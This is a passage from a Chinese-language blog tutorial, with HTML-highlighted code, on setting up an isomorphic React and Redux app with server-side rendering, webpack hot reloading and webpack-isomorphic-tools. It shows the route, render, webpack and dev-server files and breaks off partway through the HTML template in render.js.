class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;Route,IndexRoute&#125; <span class="keyword">from</span> <span class="string">'react-router'</span>;</span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'../common/components/App'</span>;</span><br><span class="line"><span class="keyword">import</span> Item <span class="keyword">from</span> <span class="string">'../common/components/Item'</span>;</span><br><span class="line"><span class="keyword">import</span> List <span class="keyword">from</span> <span class="string">'../common/components/List'</span>;</span><br><span class="line"><span class="keyword">import</span> Publish <span class="keyword">from</span> <span class="string">'../common/components/Publish'</span>;</span><br><span class="line"><span class="keyword">import</span> Space <span class="keyword">from</span> <span class="string">'../common/components/Space'</span>;</span><br><span class="line"><span class="keyword">import</span> LogIn <span class="keyword">from</span> <span class="string">'../common/components/LogIn'</span>;</span><br><span class="line"><span class="keyword">import</span> Reg <span class="keyword">from</span> <span class="string">'../common/components/Reg'</span>;</span><br><span class="line"><span class="keyword">const</span> routes = (</span><br><span class="line">    &lt;Route path=<span class="string">"/"</span> component=&#123;App&#125;&gt;</span><br><span class="line">            &lt;IndexRoute component=&#123;List&#125;/&gt;</span><br><span class="line">            &lt;Route path=<span class="string">"/item/:id"</span> component=&#123;Item&#125;/&gt;</span><br><span class="line">            &lt;Route path=<span class="string">"/space"</span> component=&#123;Space&#125;/&gt;</span><br><span class="line">            &lt;Route path=<span class="string">"/publish"</span> component=&#123;Publish&#125;/&gt;</span><br><span class="line">            &lt;Route path=<span class="string">"/logIn"</span> component=&#123;LogIn&#125;/&gt;</span><br><span class="line">            &lt;Route path=<span class="string">"/reg"</span> component=&#123;Reg&#125;/&gt;</span><br><span class="line">    &lt;<span class="regexp">/Route&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default routes;</span></span><br></pre></td></tr></table></figure></p><p>render.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">handleRender</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    match(&#123;<span class="attr">routes</span>:routesApp,<span class="attr">location</span>:req.url&#125;,(err,redirectLocation,renderProps)=&gt;&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            res.status(<span class="number">500</span>).end(<span class="string">`server error: <span class="subst">$&#123;err&#125;</span>`</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(redirectLocation)&#123;</span><br><span class="line">            res.redirect(redirectLocation.pathname+redirectLocation.search)</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(renderProps)&#123;</span><br><span class="line">            <span class="keyword">const</span> store = storeApp(&#123;&#125;);</span><br><span class="line">            <span class="built_in">Promise</span>.all([</span><br><span class="line">                store.dispatch(selectAuthor(<span class="string">'all'</span>)),</span><br><span class="line">                store.dispatch(fetchPostsIfNeeded(<span class="string">'all'</span>))</span><br><span class="line">            ])</span><br><span class="line">            .then(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">                <span class="keyword">const</span> html = renderToString(</span><br><span class="line">                    &lt;Provider store=&#123;store&#125;&gt;</span><br><span class="line">                        &lt;RouterContext &#123;...renderProps&#125;/&gt;</span><br><span class="line">                    &lt;<span class="regexp">/Provider&gt;</span></span><br><span class="line"><span class="regexp">                )</span></span><br><span class="line"><span class="regexp">                const finalState = store.getState();</span></span><br><span class="line"><span class="regexp">                res.end(renderFullPage(html,finalState));</span></span><br><span class="line"><span class="regexp">            &#125;)</span></span><br><span class="line"><span class="regexp">        &#125; else &#123;</span></span><br><span class="line"><span class="regexp">            res.status(404).end('404 not found')</span></span><br><span class="line"><span class="regexp">        &#125;</span></span><br><span class="line"><span class="regexp">    &#125;)</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><h3 id="技术选型"><a href="#技术选型" class="headerlink" title="技术选型:"></a>技术选型:</h3><p>. React</p><p>. Redux管理state</p><p>. React-router管理前端路由</p><p>. React 服务端渲染</p><p>. Webpack构建</p><p>. Ant design UI</p><p>. Express</p><p>. Mongoose操作数据库</p><h3 id="项目目录结构"><a href="#项目目录结构" class="headerlink" title="项目目录结构:"></a>项目目录结构:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">--- assests //静态资源</span><br><span class="line">--- public //开发环境的bundle文件</span><br><span class="line">--- client //客户端部分</span><br><span class="line">--- index.js //客户端入口文件，渲染React实例</span><br><span class="line">--- devTools.js //开发工具配置</span><br><span class="line">--- server //服务端部分</span><br><span class="line">--- Models //操作数据库</span><br><span class="line">--- api //提供REST API</span><br><span class="line">--- app.js //服务器主文件</span><br><span class="line">--- render.js //React 服务端渲染逻辑</span><br><span class="line">--- index.js //服务器入口文件</span><br><span class="line">--- common //同构部分</span><br><span class="line">--- components //组件</span><br><span class="line">--- actions //Redux action</span><br><span class="line">--- reducers //Redux reducer</span><br><span class="line">--- configureStore.js //store生成器</span><br><span class="line">--- routes.js //router生成器</span><br><span class="line">---webpack</span><br><span class="line">--- run-webpack-server.js //运行webpack服务的入口文件</span><br><span class="line">--- webpack-assests.json // webpack-isomorphic-tools生成的静态资源路径文件</span><br><span class="line">--- webpack-dev-server.js // webpack服务器</span><br><span class="line">--- webpack-isomorphic-tools.configuration.js //webpack-isomorphic-tools配置文件</span><br><span class="line">--- webpack-status.json // webpack-isomorphic-tools的日志文件</span><br><span class="line">--- webpack.config.js //webpack配置文件</span><br><span class="line"></span><br><span class="line">--- .babelrc</span><br><span class="line">--- .eslintrc</span><br><span class="line">--- .gitignore</span><br><span class="line">--- LICENSE</span><br><span class="line">--- package.json</span><br><span class="line">--- README.md</span><br></pre></td></tr></table></figure><h3 id="webpack"><a href="#webpack" class="headerlink" title="webpack:"></a>webpack:</h3><p>webpack配置:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> HtmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">'html-webpack-plugin'</span>);</span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>);</span><br><span class="line"><span class="keyword">const</span> Webpack_isomorphic_tools_plugin = <span class="built_in">require</span>(<span class="string">'webpack-isomorphic-tools/plugin'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> webpack_isomorphic_tools_plugin = </span><br><span class="line">  <span class="keyword">new</span> Webpack_isomorphic_tools_plugin(<span class="built_in">require</span>(<span class="string">'./webpack-isomorphic-tools-configuration'</span>))</span><br><span class="line">  .development()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> HtmlWebpackPluginConfig = <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">    template: <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../client/index.html`</span>,</span><br><span class="line">    filename: <span class="string">'index.html'</span>,</span><br><span class="line">    inject: <span class="literal">false</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    context: path.join(__dirname,<span class="string">'..'</span>),</span><br><span class="line">    entry:[</span><br><span class="line">        <span class="string">'webpack-hot-middleware/client?path=http://localhost:3001/__webpack_hmr'</span>,</span><br><span class="line">        <span class="string">'./client/index.js'</span></span><br><span class="line">    ],</span><br><span class="line">    output:&#123;</span><br><span class="line">        path: <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../dist`</span>,</span><br><span class="line">        publicPath: <span class="string">'http://localhost:3001/public/'</span>,</span><br><span class="line">        filename: <span class="string">'[name].[hash].js'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="built_in">module</span>: &#123;</span><br><span class="line">        loaders: [</span><br><span class="line">            &#123;</span><br><span class="line">                test:<span class="regexp">/\.jsx?$/</span>,</span><br><span class="line">                loaders: [<span class="string">"react-hot-loader"</span>,<span class="string">"babel-loader"</span>],</span><br><span class="line">                exclude: <span class="regexp">/node_modules/</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                test:<span class="regexp">/\.css$/</span>,</span><br><span class="line">                loaders: [<span class="string">'style-loader'</span>,<span class="string">'css-loader'</span>]</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                test:<span class="regexp">/\.scss$/</span>,</span><br><span class="line">                loaders: [<span class="string">'style-loader'</span>,<span class="string">'css-loader'</span>,<span class="string">'sass-loader'</span>]</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                test: webpack_isomorphic_tools_plugin.regular_expression(<span class="string">'images'</span>),</span><br><span class="line">                loader: <span class="string">'url-loader?limit=10240'</span>, <span class="comment">// any image below or equal to 10K will be converted to inline base64 instead</span></span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    plugins: [</span><br><span class="line">        HtmlWebpackPluginConfig,</span><br><span class="line">        webpack_isomorphic_tools_plugin,</span><br><span class="line">        <span class="keyword">new</span> webpack.HotModuleReplacementPlugin(),</span><br><span class="line">        <span class="keyword">new</span> webpack.NoEmitOnErrorsPlugin(),</span><br><span class="line">        <span class="keyword">new</span> webpack.BannerPlugin(<span class="string">"This file is created by Luo Xia"</span>)</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>webpack服务: webpack-dev-server.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> express <span class="keyword">from</span> <span class="string">'express'</span>;</span><br><span class="line"><span class="keyword">import</span> path <span class="keyword">from</span> <span class="string">'path'</span>;</span><br><span class="line"><span class="keyword">import</span> qs <span class="keyword">from</span> <span class="string">'qs'</span>;</span><br><span class="line"><span class="keyword">import</span> webpack <span class="keyword">from</span> <span class="string">'webpack'</span>;</span><br><span class="line"><span class="keyword">import</span> webpackDevMiddleware <span class="keyword">from</span> <span class="string">'webpack-dev-middleware'</span>;</span><br><span class="line"><span class="keyword">import</span> webpackHotMiddleware <span class="keyword">from</span> <span class="string">'webpack-hot-middleware'</span>;</span><br><span class="line"><span class="keyword">import</span> webpackConfig <span class="keyword">from</span> <span class="string">'./webpack.config'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> express();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3001</span>;</span><br><span class="line"><span class="keyword">const</span> compiler = webpack(webpackConfig);</span><br><span class="line"></span><br><span class="line">compiler.plugin(<span class="string">'compilation'</span>,compilation=&gt;&#123;</span><br><span class="line">    compilation.plugin(<span class="string">'html-webpack-plugin-after-emit'</span>, (data, cb)=&gt; &#123;</span><br><span class="line">        webpackHotMiddleware(compiler).publish(&#123; <span class="attr">action</span>: <span class="string">'reload'</span> &#125;);</span><br><span class="line">        cb();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">app.use(webpackDevMiddleware(compiler,&#123;</span><br><span class="line">    noInfo:<span class="literal">true</span>,</span><br><span class="line">    publicPath: webpackConfig.output.publicPath,</span><br><span class="line">    hot: <span class="literal">true</span>,</span><br><span class="line">    stats: &#123;</span><br><span class="line">            colors: <span class="literal">true</span>,</span><br><span class="line">            chunks: <span class="literal">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">     headers: &#123;</span><br><span class="line">         <span class="string">'Access-Control-Allow-Origin'</span>: <span class="string">'*'</span>,</span><br><span class="line">        <span class="string">"Access-Control-Allow-Methods"</span>:<span class="string">"PUT,POST,GET,DELETE,OPTIONS"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    historyApiFallback: <span class="literal">true</span></span><br><span class="line">&#125;));</span><br><span class="line">app.use(express.static(path.join(__dirname,<span class="string">'../dist'</span>)))</span><br><span class="line"></span><br><span class="line">app.use(webpackHotMiddleware(compiler,&#123;</span><br><span class="line">    path: <span class="string">'/__webpack_hmr'</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.use(<span class="string">'*'</span>,(req,res,next)=&gt;&#123;</span><br><span class="line">    res.header(<span class="string">"Access-Control-Allow-Origin"</span>, <span class="string">"*"</span>);</span><br><span class="line">    res.header(<span class="string">'Access-Control-Allow-Headers'</span>, <span class="string">'Content-Type, Content-Length, Authorization, Accept, X-Requested-With'</span>);</span><br><span class="line">    res.header(<span class="string">"Access-Control-Allow-Methods"</span>,<span class="string">"PUT,POST,GET,DELETE,OPTIONS"</span>);</span><br><span class="line">    next()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(port,err=&gt;&#123;</span><br><span class="line">    <span class="keyword">if</span>(err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.error(err);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.info(<span class="string">`the webpack server has been listened at port: <span class="subst">$&#123;port&#125;</span>,haha`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h4 id="服务端渲染时静态资源问题"><a href="#服务端渲染时静态资源问题" class="headerlink" title="服务端渲染时静态资源问题"></a>服务端渲染时静态资源问题</h4><p>webpack可以将任意资源打包，那是在客户端，但是当其运行在服务端时，对于非js文件是无法正常import的，这里我的处理办法是webpack-isomorphic-tools</p><p>在index.js里:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'babel-register'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Webpack_isomorphic_tools = <span class="built_in">require</span>(<span class="string">'webpack-isomorphic-tools'</span>)</span><br><span class="line"><span class="keyword">const</span> project_base_path = <span class="built_in">require</span>(<span class="string">'path'</span>).join(__dirname, <span class="string">'..'</span>)</span><br><span class="line">global.webpack_isomorphic_tools = <span class="keyword">new</span> Webpack_isomorphic_tools(<span class="built_in">require</span>(<span class="string">'../webpack/webpack-isomorphic-tools-configuration'</span>))</span><br><span class="line">    .server(project_base_path)</span><br><span class="line">    .then(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="string">'./app'</span>);</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure></p><p>即在运行应用服务器时，先启动webpack-isomorphic-tools服务，它会在指定路径下生成webpack-assests.json和webpack-status.json，其中webpack-assests.json就指定了各个静态文件的路径:</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/%60TXZ%28%6098%7DI1%5BQ%5D40RFU10MI.png" alt="图2"></p><p><strong>注意</strong><br>起初我是将webpack-dev-server和应用服务器弄在一起的，这就会导致无法生成webpack-assests.json，就会导致静态资源加载失败</p><h4 id="使用webpack-hot-middleware热更新问题"><a href="#使用webpack-hot-middleware热更新问题" class="headerlink" title="使用webpack-hot-middleware热更新问题"></a>使用webpack-hot-middleware热更新问题</h4><p>之前一直是使用webpack-dev-server形式试想HMR的，但是这里使用了webpack-dev-middleware和webpack-hot-middleware，会有一些区别:</p><p>入口文件:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">entry:[</span><br><span class="line">        <span class="string">'webpack-hot-middleware/client?path=http://localhost:3001/__webpack_hmr'</span>,</span><br><span class="line">        <span class="string">'./client/index.js'</span></span><br><span class="line">    ]</span><br></pre></td></tr></table></figure></p><p>之所以path配置为3001服务地址是因为webpack-dev-server是运行在3001端口的，然而我在开发中是用应用服务3000端口的，所以这也涉及到跨域问题，需要设置CORS头</p><p>react-hot-loader:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test:<span class="regexp">/\.jsx?$/</span>,</span><br><span class="line">loaders: [<span class="string">"react-hot-loader"</span>,<span class="string">"babel-loader"</span>],</span><br><span class="line">exclude: <span class="regexp">/node_modules/</span></span><br></pre></td></tr></table></figure></p><p>注意这里别忘了exclude,不然会报错:ReactHotAPI is not a function</p><p>插件:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">        HtmlWebpackPluginConfig,</span><br><span class="line">        webpack_isomorphic_tools_plugin,</span><br><span class="line">        <span class="keyword">new</span> webpack.HotModuleReplacementPlugin(),</span><br><span class="line">        <span class="keyword">new</span> webpack.NoEmitOnErrorsPlugin(),</span><br><span class="line">        <span class="keyword">new</span> webpack.BannerPlugin(<span class="string">"This file is created by Luo Xia"</span>)</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure></p><p>指定路径:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.use(webpackHotMiddleware(compiler,&#123;</span><br><span class="line">    path: <span class="string">'/__webpack_hmr'</span></span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure></p><p>这里不能加<a href="http://localhost:3001，否则404" target="_blank" rel="noopener">http://localhost:3001，否则404</a></p><h3 id="同构部分"><a href="#同构部分" class="headerlink" title="同构部分"></a>同构部分</h3><p>和Redux一般写法没有差别，只是这里要抽象出一层store生成器和routes生成器:</p><p>configureStore.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;createStore,applyMiddleware,compose&#125; <span class="keyword">from</span> <span class="string">'redux'</span>;</span><br><span class="line"><span class="keyword">import</span> thunkMiddleware <span class="keyword">from</span> <span class="string">'redux-thunk'</span>;</span><br><span class="line"><span class="keyword">import</span> reducerApp <span class="keyword">from</span> <span class="string">'../common/reducers/index'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; composeWithDevTools &#125; <span class="keyword">from</span> <span class="string">'redux-devtools-extension'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span>(<span class="params">initState</span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> createStore(reducerApp,initState,composeWithDevTools(</span><br><span class="line">        applyMiddleware(thunkMiddleware)</span><br><span class="line">    ))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>注意这里的redux-dev-tools部分，如果按照如下所示使用:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> composeEnhancers = <span class="built_in">window</span>.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__ || compose;</span><br></pre></td></tr></table></figure></p><p>这样是行不通的，因为服务端并不能使用window，所以使用模块方式引入</p><p>routes.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;Route,IndexRoute&#125; <span class="keyword">from</span> <span class="string">'react-router'</span>;</span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'../common/components/App'</span>;</span><br><span class="line"><span class="keyword">import</span> Item <span class="keyword">from</span> <span class="string">'../common/components/Item'</span>;</span><br><span class="line"><span class="keyword">import</span> List <span class="keyword">from</span> <span class="string">'../common/components/List'</span>;</span><br><span class="line"><span class="keyword">import</span> Publish <span class="keyword">from</span> <span class="string">'../common/components/Publish'</span>;</span><br><span class="line"><span class="keyword">import</span> Space <span class="keyword">from</span> <span class="string">'../common/components/Space'</span>;</span><br><span class="line"><span class="keyword">import</span> LogIn <span class="keyword">from</span> <span class="string">'../common/components/LogIn'</span>;</span><br><span class="line"><span class="keyword">import</span> Reg <span class="keyword">from</span> <span class="string">'../common/components/Reg'</span>;</span><br><span class="line"><span class="keyword">const</span> routes = (</span><br><span class="line">    &lt;Route path=<span class="string">"/"</span> component=&#123;App&#125;&gt;</span><br><span class="line">            &lt;IndexRoute component=&#123;List&#125;/&gt;</span><br><span class="line">            &lt;Route path=<span class="string">"/item/:id"</span> component=&#123;Item&#125;/&gt;</span><br><span class="line">            &lt;Route path=<span class="string">"/space"</span> component=&#123;Space&#125;/&gt;</span><br><span class="line">            &lt;Route path=<span class="string">"/publish"</span> component=&#123;Publish&#125;/&gt;</span><br><span class="line">            &lt;Route path=<span class="string">"/logIn"</span> component=&#123;LogIn&#125;/&gt;</span><br><span class="line">            &lt;Route path=<span class="string">"/reg"</span> component=&#123;Reg&#125;/&gt;</span><br><span class="line">    &lt;<span class="regexp">/Route&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default routes;</span></span><br></pre></td></tr></table></figure></p><h3 id="完整的服务端渲染部分"><a href="#完整的服务端渲染部分" class="headerlink" title="完整的服务端渲染部分:"></a>完整的服务端渲染部分:</h3><p>render.js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;renderToString&#125; <span class="keyword">from</span> <span class="string">'react-dom/server'</span>;</span><br><span class="line"><span class="keyword">import</span> qs <span class="keyword">from</span> <span class="string">'qs'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;Provider&#125; <span class="keyword">from</span> <span class="string">'react-redux'</span>;</span><br><span class="line"><span class="keyword">import</span> reducerApp <span class="keyword">from</span> <span class="string">'../common/reducers/index'</span>;</span><br><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;RouterContext,match&#125; <span class="keyword">from</span> <span class="string">'react-router'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;selectAuthor,fetchPostsIfNeeded&#125; <span class="keyword">from</span> <span class="string">'../common/actions/actions'</span></span><br><span class="line"><span class="keyword">import</span> storeApp <span class="keyword">from</span> <span class="string">'../common/configStore'</span>;</span><br><span class="line"><span class="keyword">import</span> routesApp <span class="keyword">from</span> <span class="string">'../common/routes'</span>;</span><br><span class="line"><span class="keyword">import</span> fetch <span class="keyword">from</span> <span class="string">'isomorphic-fetch'</span></span><br><span class="line"><span class="keyword">import</span> fs <span class="keyword">from</span> <span class="string">'fs'</span>;</span><br><span class="line"><span class="keyword">import</span> path <span class="keyword">from</span> <span class="string">'path'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">renderFullPage</span>(<span class="params">html,initState</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> main = <span class="built_in">JSON</span>.parse(fs.readFileSync(path.join(__dirname,<span class="string">'../webpack/webpack-assets.json'</span>))).javascript.main;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html lang="en"&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;meta 